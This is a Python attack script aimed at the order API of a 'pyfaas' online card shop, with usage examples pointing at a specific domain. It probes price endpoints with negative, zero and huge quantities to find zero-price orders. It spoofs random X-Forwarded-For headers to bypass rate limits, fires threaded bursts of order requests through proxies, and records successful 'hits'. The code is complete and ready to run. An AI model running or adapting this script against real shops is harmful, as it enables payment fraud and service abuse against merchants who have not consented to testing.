#!/usr/bin/env python3
"""
赤马/pyfaas 下单链探测：Pay/order 限频绕过、负数量、价格篡改。

示例:
  python3 pay_order_brute.py -u https://s.sggyx.com --token xiaoy --goods n06507 --probe price
  python3 pay_order_brute.py -u https://s.sggyx.com --token xiaoy --goods n06507 --nums -1,0,1,99999 --xff -w 10
  python3 pay_order_brute.py -u https://s.sggyx.com --token xiaoy --goods n06507 --xff --burst 50
"""
from __future__ import annotations

import argparse
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Any

import requests

from faka_common import DEFAULT_UA, ensure_out, json_or_text, log, random_xff_headers, resolve_proxy, save_hit


def headers(use_xff: bool, extra: dict | None = None) -> dict[str, str]:
    h = {"User-Agent": DEFAULT_UA, "Content-Type": "application/json"}
    if use_xff:
        h.update(random_xff_headers())
    if extra:
        h.update(extra)
    return h


def post_json(base: str, path: str, body: dict, timeout: int, proxy: str, use_xff: bool) -> Any:
    url = base.rstrip("/") + path
    proxies = {"http": proxy, "https": proxy} if proxy else None
    r = requests.post(url, json=body, headers=headers(use_xff), timeout=timeout, proxies=proxies, verify=False)
    return json_or_text(r)


PRICE_PATHS = [
    "/shopApi/Shop/getGoodsPrice",
    "/shopApi/Goods/getGoodsPrice",
    "/shopApi/Pay/getGoodsPrice",
    "/shopApi/Goods/price",
]


def probe_price(base: str, token: str, goods: str, nums: list, contact: str, timeout: int, proxy: str, use_xff: bool) -> list[dict]:
    results = []
    for num in nums:
        body = {"token": token, "goods_id": goods, "num": num, "contact": contact}
        data = None
        for path in PRICE_PATHS:
            data = post_json(base, path, body, timeout, proxy, use_xff)
            if isinstance(data, dict):
                break
        row = {"num": num, "resp": data}
        results.append(row)
        if isinstance(data, dict):
            inner = data.get("data") or {}
            amt = inner.get("total_amount") if isinstance(inner, dict) else None
            log(f"  getGoodsPrice num={num} -> total_amount={amt} msg={data.get('msg')}")
            if amt is not None and float(amt) <= 0:
                save_hit(Path("/data/tools/faka/out/pay_order_hits.jsonl"), "zero_price", {"goods": goods, **row})
        else:
            log(f"  getGoodsPrice num={num} -> 无有效 JSON（端点可能不存在）")
    return results


def probe_order(base: str, token: str, goods: str, num: int, contact: str, pay_type: str, timeout: int, proxy: str, use_xff: bool) -> Any:
    body = {
        "token": token,
        "goods_id": goods,
        "num": num,
        "contact": contact,
        "pay_type": pay_type,
        "coupon": "",
    }
    return post_json(base, "/shopApi/Pay/order", body, timeout, proxy, use_xff)


def probe_burst(base: str, token: str, goods: str, num: int, contact: str, pay_type: str, n: int, workers: int, timeout: int, proxy: str, use_xff: bool, out: str) -> None:
    log(f"burst Pay/order x{n} workers={workers} xff={use_xff}")

    def one(i: int):
        data = probe_order(base, token, goods, num, contact, pay_type, timeout, proxy, use_xff)
        ok = isinstance(data, dict) and data.get("code") == 1
        return i, ok, data

    ok_n = 0
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(one, i) for i in range(n)]
        for fut in as_completed(futs):
            i, ok, data = fut.result()
            if ok:
                ok_n += 1
                save_hit(Path(out), "pay_order_ok", {"i": i, "resp": data})
            elif isinstance(data, dict) and "频繁" not in str(data.get("msg", "")):
                save_hit(Path(out), "pay_order_resp", {"i": i, "resp": data})
    log(f"burst done ok={ok_n}/{n}")


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="pyfaas Pay/order 链探测")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--token", required=True)
    ap.add_argument("--goods", required=True, help="goods_id 如 n06507 或数字 ID")
    ap.add_argument("--contact", default="test@test.com")
    ap.add_argument("--pay-type", default="alipay")
    ap.add_argument("--num", type=int, default=1)
    ap.add_argument("--nums", default="", help="价格探测用逗号分隔，如 -1,0,1")
    ap.add_argument("--probe", choices=["price", "order", "burst", "all"], default="all")
    ap.add_argument("--burst", type=int, default=30, help="burst 次数")
    ap.add_argument("-w", "--workers", type=int, default=10)
    ap.add_argument("--timeout", type=int, default=20)
    ap.add_argument("--proxy", default="auto", help="auto=读.env.proxy并健康检查，none=直连")
    ap.add_argument("--xff", action="store_true")
    ap.add_argument("--out", default="/data/tools/faka/out/pay_order_hits.jsonl")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    proxy = resolve_proxy("" if args.proxy == "none" else args.proxy)
    nums = [int(x) for x in args.nums.split(",") if x.strip()] if args.nums else [-1, 0, 1, 99999]

    if args.probe in ("price", "all"):
        log("[*] 探测 getGoodsPrice (Shop/getGoodsPrice 优先)")
        probe_price(args.url, args.token, args.goods, nums, args.contact, args.timeout, proxy, args.xff)

    if args.probe in ("order", "all"):
        log("[*] 单次 Pay/order")
        data = probe_order(args.url, args.token, args.goods, args.num, args.contact, args.pay_type, args.timeout, proxy, args.xff)
        log(json.dumps(data, ensure_ascii=False)[:400])
        if isinstance(data, dict) and data.get("code") == 1:
            save_hit(Path(args.out), "pay_order_ok", {"resp": data})

    if args.probe in ("burst", "all"):
        probe_burst(args.url, args.token, args.goods, args.num, args.contact, args.pay_type, args.burst, args.workers, args.timeout, proxy, args.xff, args.out)


if __name__ == "__main__":
    main()
